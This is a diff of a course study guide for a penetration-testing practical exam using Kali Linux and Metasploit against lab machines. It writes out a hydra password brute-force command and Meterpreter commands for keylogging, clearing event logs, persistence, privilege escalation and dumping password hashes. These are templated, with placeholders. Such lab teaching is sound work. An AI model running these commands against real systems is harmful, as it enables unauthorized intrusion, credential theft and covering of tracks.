@@ -1,12 +1,17 @@
 # Practical Exam 1 Practice
 
+>Author: Dongyi Guo
+>
+>Doc Version: 1.2
+
 * During the formal test, you are only using Kali Linux, steps for setting up other machines are here for your own practice.
+* Everything that is inside ```<...>``` requires you to find proper answer to fill in.
 
 ## Question 1
 
 #### Linux Network Setup (Kali, Metasploitable2):
 
-To setup network on Linux:
+To assign IP  on Linux:
 
 ```bash
 ip a a <IP>/<Prefix> dev <NetworkInterface>
@@ -74,12 +79,18 @@ To turn off the firewall on Windows (for your own practice) :
 
 ## Question 3
 
-To brute-force a password of a given username with a specific network protocol on a remote host, use ```hydra```:
+To brute-force a password of a given username with a specific service protocol on a remote host, use ```hydra```:
 
 * You will need a password dictionary to power the brute-force operation.
 
 ```bash
-hydra -l <LoginUsername> -P <PathToPasswordDictionary> <HostIPAddress> <NetworkProtocol> -t <ParallelAttempts>
+hydra -l <LoginUsername> -P <PathToPasswordDictionary> <HostIPAddress> <ServiceProtocol> -t <ParallelAttempts>
+```
+
+To check all available service protocols, use
+
+```bash
+man hydra
 ```
 
 ## Question 4
@@ -113,7 +124,7 @@ exploit
 During Meterpreter session ( ```meterpreter>``` ), commands that could be useful:
 
 ```bash
-cd # Change directory
+cd <DirectoryPath> # Change directory
 ls # List directory
 pwd # Current directory
 sysinfo # System information
@@ -130,12 +141,14 @@ clearev # Clean event logs
 getpid # Get current process ID
 ps # List current Processes on target host
 migrate <processID> # Migrate to process ID
-keyscan_start # Start key logging, only works with good process privilege.
-keyscan_dump # Dump key logging, only works with good process privilege.
-keyscan_stop # Stop key logging, only works with good process privilege.
+# Keylogger only works when Meterpreter is paratisitizing a process with relative high privilege:
+keyscan_start # Start key logging
+keyscan_dump # Dump key logging
+keyscan_stop # Stop key logging
 
 # Backgroud current session
 background
+# Or
 bg
 # Or ctrl + z
 ```
@@ -164,7 +177,7 @@ run # alias of exploit, use any
 
 After that, if XP gets rebooted, it will send back the connection and Kali will enter Meterpreter prompt automatically.
 
-## Additionally
+## MSF Essentials
 
 During MSF prompts, several things:
 
@@ -182,3 +195,55 @@ show targets # Show possible targets for current exploit
 set sTArTuP SYSTEM # That is okay
 set STARTUP system # NOT OKAY
 ```
+
+## Post-Exploitation Information Gathering
+
+* This means gathering information after you retrieve administrative priviledge on a target.
+
+If you have a reverse shell session and you want to upgrade it to Meterpreter session: use:
+
+```bash
+sessions # Check the session ID of your reverse shell session
+sessions -u <ReverseShellSessionID>
+```
+
+If you have a unprivileged Meterpreter session, to find exploit escalating your privilege, use:
+
+```bash
+sessions # Check the session ID of your unprivileged session
+use post/multi/recon/local_exploit_suggester
+set session <UnprivilegedMeterpreterSessionID>
+run
+```
+
+to find possible vulnerabilities can be used to escalate your priviledge.
+
+Once you have the administrative privilege, to find all modules that are helpful for information gathering, use:
+
+```bash
+# For Linux
+search post/linux/gather
+# For Windows
+search post/windows/gather
+```
+
+Common useful modules to gather information about your target:
+
+```bash
+use post/<linux/windows>/gather/checkvm # Identify whether a target is virtual machine, and if so what virtualisation it is
+use post/linux/gather/checkcontainer # Identify whether a target is a containerized, and if so what type of container it is
+use post/linux/gather/hashdump # Dump user's hashes on screen
+use post/windows/gather/smart_hashdump # Dump user's hashes on screen and save them into /root/.msf4/loot/
+use post/linux/gather/enum_protections # List target's security protection measurements
+use post/linux/gather/enum_configs # List target's service configurations and save them into /root/.msf4/loot/
+use post/linux/gather/enum_network # List target's network infrastructure information and configurations and save them into /root/.msf4/loot/
+use post/linux/gather/enum_system # List target's system information and save them into /root/.msf4/loot/
+```
+
+Then set the Meterpreter session and run to gather the information:
+
+```bash
+set session <MeterpreterSessionID>
+run
+```
+
